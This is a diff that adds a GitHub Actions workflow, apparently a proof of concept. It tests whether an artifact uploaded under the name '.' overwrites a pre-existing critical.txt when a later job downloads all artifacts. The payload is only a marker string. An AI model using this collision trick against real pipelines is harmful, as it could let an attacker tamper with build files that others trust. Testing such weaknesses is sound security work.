@@ -1,0 +1,46 @@
+name: artifact-dot-collision
+on:
+  push:
+    branches: [main, 'acol/**']
+  workflow_dispatch: {}
+
+permissions:
+  contents: read
+  actions: read
+
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create file that has same basename as a target
+        run: |
+          mkdir -p w
+          echo "ATTACKER_OVERWROTE" > w/critical.txt
+      - name: Upload as "."
+        uses: actions/upload-artifact@v4
+        with:
+          name: "."
+          path: w/critical.txt
+
+  victim_download:
+    needs: upload
+    runs-on: ubuntu-latest
+    steps:
+      - name: Pre-create a file named critical.txt in the download path
+        run: |
+          mkdir -p downloaded
+          echo "ORIGINAL_VICTIM_FILE" > downloaded/critical.txt
+          ls -la downloaded/
+          cat downloaded/critical.txt
+      - name: Download all into downloaded/
+        uses: actions/download-artifact@v4
+        with:
+          path: downloaded
+      - name: Check if critical.txt was OVERWRITTEN
+        run: |
+          echo "=== content ==="
+          cat downloaded/critical.txt
+          echo "=== ls ==="
+          find downloaded -maxdepth 4
+          echo "=== sha ==="
+          sha256sum downloaded/critical.txt 2>/dev/null || true
